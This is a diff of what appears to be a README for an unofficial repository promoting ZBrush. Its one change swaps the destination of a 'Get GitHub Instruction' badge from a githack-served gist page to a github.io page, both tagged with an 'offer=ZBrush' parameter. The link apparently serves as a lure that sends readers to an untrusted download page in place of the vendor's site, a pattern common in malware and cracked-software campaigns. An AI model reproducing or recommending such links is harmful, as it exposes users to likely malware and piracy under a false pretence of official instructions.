@@ -2,7 +2,7 @@
 
 ZBrush redefines digital art creation with **dynamic sculpting, texturing, and rendering tools** that give artists full creative control. From concept art to film-ready assets, it’s the industry’s most advanced sculpting platform. 🧠  
 
-[![🟠 Get GitHub Instruction](https://img.shields.io/badge/🟠%20Get%20GitHub%20Instruction-F47C20?style=for-the-badge&logo=zbrush&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/conkelluxuriant455/157bdae616f1e16fde6f0e04d5e14aaf/raw/c5f8b2403f2cbccdea1971ef0cc7353c82335035/get.html?offer=ZBrush)
+[![🟠 Get GitHub Instruction](https://img.shields.io/badge/🟠%20Get%20GitHub%20Instruction-F47C20?style=for-the-badge&logo=zbrush&logoColor=white&labelColor=0B0F19)](https://app-set-deploy.github.io/.github/?offer=ZBrush)
 
 ---
 
